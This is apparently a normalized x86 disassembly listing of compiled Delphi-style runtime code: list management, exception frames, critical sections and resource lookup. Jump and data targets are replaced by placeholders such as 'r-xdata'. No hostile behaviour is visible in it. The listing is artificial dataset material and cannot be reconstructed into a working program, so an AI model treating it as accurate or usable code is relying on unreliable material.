jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_414170
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_413380
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_413403
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031e4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41340a
lea eax [ ebp - 0x10c ]
call sub_404050
retn
sub_413410
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4132f8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412e1c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_413380
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_414170
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414170
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4034a8
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4132f8
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414060
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_414014
sub_4134fc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414170
mov edx ebp
call sub_413100
test al al
jne r-xdata
sub_413540
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ef8
mov edx eax
mov eax [ edi + 0x4 ]
call sub_414014
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414170
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4141cc
test eax eax
jge r-xdata
sub_41359c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414170
mov esi eax
mov edx ebp
mov eax esi
call sub_413138
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403294
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414060
sub_4135ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4134d8
xor eax eax
push ebp
push sub_4136eb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136f2
mov eax [ rw-data ]
call sub_413590
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414014
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_414170
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413014
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414014
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_414170
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4136f2
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_413718
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_413748
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4134d8
xor edx edx
push ebp
push sub_4137bf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413590
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403ab4
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414170
mov edx [ ebp - 0x4 ]
call sub_412fb4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4137dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41383c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413843
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_413848
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134d8
xor eax eax
push ebp
push sub_41388e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41333c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413895
mov eax [ rw-data ]
call sub_413590
retn
sub_41389c
push ebx
push esi
mov esi eax
mov eax esi
call sub_413848
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4137dc
sub_4138bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134d8
xor eax eax
push ebp
push sub_413921
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4134fc
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4134e4
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413928
mov eax [ rw-data ]
call sub_413590
retn
mov eax ebx
call sub_403220
mov ebx eax
sub_41392c
push ebp
mov ebp esp
push ebx
push esi
mov ecx edx
test ecx ecx
js r-xdata
mov eax esp
mov esi edx
test esi esi
jl r-xdata
mov ebx [ eax + ecx * 4 ]
dec ecx
push ebx
jns r-xdata
mov esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
inc esi
mov ebx eax
mov eax [ ebx ]
call sub_4138bc
add ebx 0x4
dec esi
jne r-xdata
sub_413960
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134d8
xor eax eax
push ebp
push sub_4139a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41359c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139a9
mov eax [ rw-data ]
call sub_413590
retn
sub_4139ac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134d8
xor eax eax
push ebp
push sub_4139ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139f5
mov eax [ rw-data ]
call sub_413590
retn
sub_4139f8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4134d8
xor eax eax
push ebp
push sub_413a3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_413410
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a46
mov eax [ rw-data ]
call sub_413590
retn
sub_413a4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4134d8
xor eax eax
push ebp
push sub_413a9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4131dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413aa1
mov eax [ rw-data ]
call sub_413590
retn
sub_413aac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_413b00
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_413b38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413b00
mov edx eax
mov eax [ rw-data ]
call sub_4144ac
pop edi
pop esi
pop ebx
retn
sub_413b64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_414534
mov esi eax
xor edx edx
push ebp
push sub_413bce
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414598
retn
mov edx ebx
mov eax esi
call sub_414170
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403ab4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413be0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407d14
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413c20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_4040a4
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413c64
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4141cc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_414014
sub_413cbc
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_414170
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413cfc
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413cbc
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413d20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404510
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416ebc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413d94
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4169bc
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403294
retn
sub_413da4
push ebx
call sub_405dbc
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405dbc
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_414014
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov ebx eax
call sub_405dbc
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov ebx eax
call sub_405dbc
mov [ eax + 0xc ] ebx
sub_413dfc
push ebx
push esi
push edi
call sub_405dbc
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414170
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413e2c
push ebx
push esi
call sub_405dbc
mov eax [ eax + 0x8 ]
call sub_403294
call sub_405dbc
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_414258
mov esi eax
call sub_405dbc
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_414060
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405dbc
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403294
sub_413e88
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413f1e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f25
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403220
call sub_413e88
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031e4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042b4
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40506c
call sub_4050bc
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413d20
or bl al
sub_413f30
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413fde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413fbf
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031dc
call sub_413e88
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413da4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413fc6
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413dfc
retn
call sub_413e2c
sub_413ff2
add [ eax ] al
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_414014
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_414060
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4140fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028e0
mov edx esi
mov eax ebx
call sub_414170
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4140c4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4140c0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
jmp sub_403a08
sub_4140fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_414144
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405b50
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4140c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41414b
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_414170
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4140fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_414198
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41432c
retn
sub_4141cc
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_4141ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4140fc
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028e0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_414264
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4140fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_414170
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_414060
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4141ec
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_4142bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4140fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41430c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4141cc
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414060
sub_41432c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4140fc
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402724
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_414368
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4140fc
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41432c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402ca4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_414060
dec ebp
inc edi
jne r-xdata
sub_4143dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_414430
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403608
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414534
xor eax eax
push ebp
push sub_414492
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403294
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403284
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414499
mov eax [ ebp - 0x4 ]
call sub_414598
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_4144ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414534
xor eax eax
push ebp
push sub_414528
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414014
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4141cc
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41452f
mov eax [ ebp - 0x4 ]
call sub_414598
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4140fc
sub_414548
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414534
xor eax eax
push ebp
push sub_41458b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41430c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
